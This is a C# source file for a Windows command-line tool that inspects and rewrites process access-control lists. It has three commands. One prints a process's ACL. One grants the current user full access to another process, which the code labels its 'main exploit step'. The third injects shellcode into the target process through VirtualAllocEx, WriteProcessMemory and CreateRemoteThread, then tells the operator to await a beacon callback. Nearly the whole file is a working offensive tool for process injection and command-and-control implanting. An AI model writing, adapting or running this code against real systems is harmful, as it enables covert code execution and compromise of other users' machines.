
using ProcInject;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

internal static class Program
{
    // ------------------------------------------------------------
    // Constants / Flags
    // ------------------------------------------------------------

    private const uint READ_CONTROL = 0x00020000;
    private const uint WRITE_DAC = 0x00040000;
    private const int FULL_PROCESS_ACCESS = 0x001FFFFF;

    private const int SE_KERNEL_OBJECT = 6;

    private const uint OWNER_SECURITY_INFORMATION = 0x00000001;
    private const uint GROUP_SECURITY_INFORMATION = 0x00000002;
    private const uint DACL_SECURITY_INFORMATION = 0x00000004;


    // ------------------------------------------------------------
    // Native Windows APIs P/Invoke
    // ------------------------------------------------------------

    // Open and close processes -----------------------

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(
        uint desiredAccess,
        bool inheritHandle,
        int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr handle);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr LocalFree(IntPtr memory);

    // DACL manipulation -----------------------

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern uint GetSecurityInfo(
        IntPtr handle,
        int objectType,
        uint securityInformation,
        out IntPtr owner,
        out IntPtr group,
        out IntPtr dacl,
        out IntPtr sacl,
        out IntPtr securityDescriptor);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern uint GetSecurityDescriptorLength(
    IntPtr pSecurityDescriptor);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool GetSecurityDescriptorDacl(
        IntPtr pSecurityDescriptor,
        out bool lpbDaclPresent,
        out IntPtr pDacl,
        out bool lpbDaclDefaulted);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern uint SetSecurityInfo(
    IntPtr handle,
    int objectType,
    uint securityInformation,
    IntPtr pOwner,
    IntPtr pGroup,
    IntPtr pDacl,
    IntPtr pSacl);

    // Process code injection -----------------------

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);


    // ------------------------------------------------------------
    // Internal function: Read process security descriptor
    // ------------------------------------------------------------

    private static RawSecurityDescriptor ReadProcessSecurity(int pid)
    {
        IntPtr handle = OpenProcess(
            READ_CONTROL,
            false,
            pid);

        uint result = GetSecurityInfo(
            handle,
            SE_KERNEL_OBJECT,
            OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION,
            out _,
            out _,
            out _,
            out _,
            out IntPtr securityDescriptor);

        if (result != 0)
            throw new Win32Exception((int)result, "GetSecurityInfo failed.");

        if (securityDescriptor == IntPtr.Zero)
            throw new InvalidOperationException("Security descriptor was null.");

        try
        {
            uint length = GetSecurityDescriptorLength(securityDescriptor);

            byte[] buffer = new byte[length];

            Marshal.Copy(
                securityDescriptor,
                buffer,
                0,
                (int)length);

            RawSecurityDescriptor descriptor = new RawSecurityDescriptor(buffer, 0);

            return descriptor;
        }
        finally
        {
            LocalFree(securityDescriptor);
        }
    }


    // ------------------------------------------------------------
    // Internal function: Write process security descriptor
    // ------------------------------------------------------------

    private static void WriteProcessSecurity(int pid, RawSecurityDescriptor descriptor)
    {
        if (pid <= 0)
            throw new ArgumentOutOfRangeException(nameof(pid));

        if (descriptor == null)
            throw new ArgumentNullException(nameof(descriptor));

        // Serialize the descriptor
        byte[] buffer = new byte[descriptor.BinaryLength];
        descriptor.GetBinaryForm(buffer, 0);

        // Validate that the descriptor can be reconstructed.
        RawSecurityDescriptor validated = new RawSecurityDescriptor(buffer, 0);
        if (validated.BinaryLength != buffer.Length)
            throw new InvalidOperationException("Security descriptor validation failed.");

        IntPtr handle = OpenProcess(
                    WRITE_DAC | READ_CONTROL,
                    false,
                    pid);

        uint result = GetSecurityInfo(
            handle,
            SE_KERNEL_OBJECT,
            OWNER_SECURITY_INFORMATION |
            GROUP_SECURITY_INFORMATION |
            DACL_SECURITY_INFORMATION,
            out IntPtr owner,
            out IntPtr group,
            out _,
            out IntPtr sacl,
            out _);

        IntPtr pSD = Marshal.AllocHGlobal(buffer.Length);
        Marshal.Copy(buffer, 0, pSD, buffer.Length);

        bool daclPresent;
        bool daclDefaulted;
        IntPtr pDacl;

        if (!GetSecurityDescriptorDacl(pSD, out daclPresent, out pDacl, out daclDefaulted) && daclPresent)
        {
            Console.WriteLine((uint)Marshal.GetLastWin32Error());
            return;
        }

        // 3. Übergeben Sie nun pDacl (statt pSD/ptr) an SetSecurityInfo
        result = SetSecurityInfo(
            handle,
            SE_KERNEL_OBJECT,
            DACL_SECURITY_INFORMATION,
            IntPtr.Zero,
            IntPtr.Zero,
            pDacl,
            IntPtr.Zero
        );

        if (result != 0)
        {
            Console.WriteLine($"[-] Error on SetSecurityInfo: {result}");
        }

        Marshal.FreeHGlobal(pSD);
    }


    // ------------------------------------------------------------
    // Display security information for process (inspection)
    // ------------------------------------------------------------

    private static void DisplaySecurityInformation(int pid)
    {
        Console.WriteLine($"[*] Reading process ACL for PID {pid}");

        RawSecurityDescriptor descriptor = ReadProcessSecurity(pid);

        Console.WriteLine($"[+] Ownership information:");
        Console.WriteLine($"  Owner: {descriptor.Owner}");
        Console.WriteLine($"  Group: {descriptor.Group}");
        Console.WriteLine($"  Control flags: {descriptor.ControlFlags}");
        Console.WriteLine();

        if (descriptor.DiscretionaryAcl == null)
        {
            Console.WriteLine("[-] No DACL available.");
            return;
        }

        Console.WriteLine("[+] DACL present:");

        for (int i = 0; i < descriptor.DiscretionaryAcl.Count; i++)
        {
            GenericAce ace = descriptor.DiscretionaryAcl[i];
            Console.WriteLine($"  ACE [{i}]:");
            Console.WriteLine(AcePrinter.Print((CommonAce)ace));
        }

        Console.WriteLine();
        Console.WriteLine("[+] SDDL:");
        Console.WriteLine($"  {descriptor.GetSddlForm(AccessControlSections.All)}");
    }
    

    // ------------------------------------------------------------
    // Adding current user to ACL (main exploit step)
    // ------------------------------------------------------------

    private static void AddCurrentUserPermissions(int pid)
    {
        Console.WriteLine($"[*] Attempting to add current user to process ACL for PID {pid}");

        RawSecurityDescriptor descriptor = ReadProcessSecurity(pid);

        SecurityIdentifier currentUser = WindowsIdentity.GetCurrent().User ?? 
            throw new InvalidOperationException("Unable to determine current user SID.");

        descriptor.DiscretionaryAcl?.InsertAce(descriptor.DiscretionaryAcl.Count, new CommonAce(
            AceFlags.ObjectInherit | AceFlags.ContainerInherit,
            AceQualifier.AccessAllowed,
            FULL_PROCESS_ACCESS,
            currentUser,
            false,
            null
            ));

        WriteProcessSecurity(pid, descriptor);

        Console.WriteLine($"[+] ACL successfully manipulated!");

        DisplaySecurityInformation(pid);
    }


    // ------------------------------------------------------------
    // Process code injection
    // ------------------------------------------------------------

    private static void InjectCode(int pid)
    {
        Console.WriteLine($"[*] Attempting to inject custom shellcode into process with PID {pid}");

        IntPtr handle = OpenProcess(
            FULL_PROCESS_ACCESS,
            false,
            pid);
        
        byte[] buf = Shellcode.shellcode;

        IntPtr addr = VirtualAllocEx(handle, IntPtr.Zero, 0x40000, 0x3000, 0x40);

        IntPtr outSize;
        WriteProcessMemory(handle, addr, buf, buf.Length, out outSize);

        IntPtr hThread = CreateRemoteThread(handle, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        Console.WriteLine($"[+] Shellcode injected into process with PID {pid}. Await beacon callback.");
    }


    // ------------------------------------------------------------
    // Main argument parsing
    // ------------------------------------------------------------

    private static void Main(string[] args)
    {
        if (args.Length == 0)
        {
            Console.WriteLine("Usage:");

            Console.WriteLine(
                "  ProcessInspector.exe inspect <PID>");
            Console.WriteLine(
                "  ProcessInspector.exe addrights <PID>");
            Console.WriteLine(
                "  ProcessInspector.exe inject <PID>");

            return;
        }

        try
        {
            switch (args[0].ToLowerInvariant())
            {
                case "inspect":
                    if (args.Length < 2 ||
                        !int.TryParse(args[1], out int pid) ||
                        pid <= 0)
                    {
                        Console.WriteLine(
                            "Invalid process ID.");
                        return;
                    }

                    DisplaySecurityInformation(pid);
                    break;

                case "addrights":
                    if (args.Length < 2 ||
                        !int.TryParse(args[1], out pid) ||
                        pid <= 0)
                    {
                        Console.WriteLine(
                            "Invalid process ID.");
                        return;
                    }

                    AddCurrentUserPermissions(pid);
                    break;

                case "inject":
                    if (args.Length < 2 ||
                        !int.TryParse(args[1], out pid) ||
                        pid <= 0)
                    {
                        Console.WriteLine(
                            "Invalid process ID.");
                        return;
                    }

                    InjectCode(pid);
                    break;

                default:
                    Console.WriteLine("Unknown command.");
                    break;
            }
        }
        catch (Win32Exception ex)
        {
            Console.WriteLine(
                $"Windows error {ex.NativeErrorCode}: {ex.Message}");
        }
        catch (Exception ex)
        {
            Console.WriteLine(
                $"Error: {ex.Message}");
        }
    }
}
